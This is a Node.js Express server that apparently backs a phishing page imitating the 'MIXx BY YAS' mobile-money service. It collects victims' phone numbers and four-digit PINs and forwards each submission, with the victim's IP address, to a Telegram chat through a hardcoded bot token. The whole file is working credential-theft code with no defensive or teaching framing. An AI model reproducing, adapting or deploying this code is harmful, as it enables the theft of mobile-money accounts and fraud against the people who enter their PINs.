const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Your Telegram credentials
const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';
const CHAT_ID = '8999616005';

// Middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from 'public' directory
app.use(express.static('public'));

// Test endpoint to check if server is running
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'Server is running!' });
});

// Main submit endpoint
app.post('/api/submit', async (req, res) => {
    console.log('=== NEW REQUEST RECEIVED ===');
    console.log('Body:', req.body);
    
    const { phoneNumber, pin } = req.body;
    
    // Validation
    if (!phoneNumber || !pin) {
        console.log('Missing fields:', { phoneNumber, pin });
        return res.status(400).json({ 
            success: false, 
            error: 'Phone number and PIN are required' 
        });
    }
    
    if (pin.length !== 4) {
        console.log('Invalid PIN length:', pin.length);
        return res.status(400).json({ 
            success: false, 
            error: 'PIN must be exactly 4 digits' 
        });
    }
    
    if (!/^[0-9]{10}$/.test(phoneNumber)) {
        console.log('Invalid phone format:', phoneNumber);
        return res.status(400).json({ 
            success: false, 
            error: 'Phone number must be 10 digits' 
        });
    }
    
    // Format message for Telegram
    const message = `🔔 MIXx BY YAS - NEW SUBMISSION 🔔\n\n📱 Phone: ${phoneNumber}\n🔐 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString('en-TZ')}\n📍 IP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'}`;
    
    try {
        console.log('Sending to Telegram...');
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        }, {
            timeout: 10000 // 10 second timeout
        });
        
        console.log('Telegram response:', response.data.ok ? 'SUCCESS' : 'FAILED');
        
        if (response.data.ok) {
            res.json({ 
                success: true, 
                message: 'Data sent successfully to Telegram' 
            });
        } else {
            throw new Error('Telegram returned error');
        }
        
    } catch (error) {
        console.error('Telegram API Error:', error.message);
        if (error.response) {
            console.error('Response data:', error.response.data);
        }
        res.status(500).json({ 
            success: false, 
            error: 'Failed to send to Telegram. Please try again.' 
        });
    }
});

// Serve index.html for all other routes (SPA support)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Frontend available at http://localhost:${PORT}`);
    console.log(`🤖 Telegram bot configured with chat ID: ${CHAT_ID}`);
    console.log(`✅ API endpoint: POST /api/submit`);
});
